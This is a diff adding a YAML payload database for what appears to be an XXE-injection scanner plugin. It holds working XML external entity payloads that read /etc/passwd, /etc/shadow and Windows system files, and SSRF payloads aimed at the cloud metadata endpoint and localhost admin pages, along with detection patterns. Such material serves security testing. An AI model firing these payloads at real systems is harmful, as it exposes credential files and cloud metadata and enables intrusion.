@@ -1,0 +1,90 @@
+# XXE Payloads Database
+# Plugin: core.injection.xxe
+
+plugin_id: core.injection.xxe
+mutation_type: field_injection
+payload_type: xxe
+
+variants:
+  # Variant 1: File disclosure (Linux)
+  - id: file_disclosure_linux
+    payloads:
+      - |
+        <?xml version="1.0"?>
+        <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+        <root>&xxe;</root>
+      - |
+        <?xml version="1.0"?>
+        <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/shadow">]>
+        <root>&xxe;</root>
+    tech_stack: [linux, unix]
+    confidence_boost: 0.25
+    detection: body_matches_any(root:x, uid=0)
+    auto_variants:
+      encoding_chains:
+        - [url_encode]
+        - [xml_entities]
+      obfuscation: []
+      max_combinations: 6
+
+  # Variant 2: File disclosure (Windows)
+  - id: file_disclosure_windows
+    payloads:
+      - |
+        <?xml version="1.0"?>
+        <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///C:/Windows/System32/drivers/etc/hosts">]>
+        <root>&xxe;</root>
+      - |
+        <?xml version="1.0"?>
+        <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///C:/boot.ini">]>
+        <root>&xxe;</root>
+    tech_stack: [windows]
+    confidence_boost: 0.25
+    detection: body_matches_any(localhost, 127.0.0.1)
+    auto_variants:
+      encoding_chains:
+        - [url_encode]
+        - [xml_entities]
+      obfuscation: []
+      max_combinations: 6
+
+  # Variant 3: SSRF internal
+  - id: ssrf_internal
+    payloads:
+      - |
+        <?xml version="1.0"?>
+        <!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>
+        <root>&xxe;</root>
+      - |
+        <?xml version="1.0"?>
+        <!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://localhost:8080/admin">]>
+        <root>&xxe;</root>
+    tech_stack: []
+    confidence_boost: 0.20
+    detection: body_matches_any(ami-id, instance-id, admin)
+    auto_variants:
+      encoding_chains:
+        - [url_encode]
+      obfuscation: []
+      max_combinations: 4
+
+keywords:
+  - xml
+  - data
+  - content
+  - body
+  - payload
+  - document
+  - file
+  - upload
+
+expected_results:
+  file_disclosure_linux:
+    indicator: file_read
+    expected_output: "root:x"
+  file_disclosure_windows:
+    indicator: file_read
+    expected_output: "localhost"
+  ssrf_internal:
+    indicator: ssrf_success
+    expected_output: "ami-id"
